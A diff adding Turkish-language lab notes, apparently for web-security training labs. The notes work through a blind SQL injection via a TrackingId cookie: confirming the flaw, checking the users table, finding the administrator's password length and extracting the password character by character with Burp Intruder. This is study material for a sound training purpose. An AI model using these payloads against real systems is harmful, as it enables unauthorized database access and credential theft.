@@ -104,7 +104,27 @@ users adlı tablodan username ve password bilgilerini çekiyoruz => https://$YOU
 ############################################################
 
 11--> 
- 
+TrackingId=xyz' AND '1'='1 welcome back yazısıgörünüyor
+TrackingId=xyz' AND '1'='2 welcome back yazısı kayboluyor blind sql var diyebiliriz.
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a => users tablosunu doğrulama
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a => tablodan kullanıcı doğrulama
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>21)='a => en son 21 karakter uzunluğunda şifre bulunuyor.
 
+Burpintruder
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§ den
+TrackingId=xyz' AND (SELECT SUBSTRING(password,21,1) FROM users WHERE username='administrator')='§a§ 21e kadar şifreyi bulup giriliyor.
+
+Grep-Match => Welcome back! ekle ve intruder length değerine göre şifreyi bul.
+
+############################################################
+#      Blind SQL injection with conditional errors         #
+#      Koşullu hatalarla kör SQL enjeksiyonu               #
+############################################################
+
+12-->
 
 
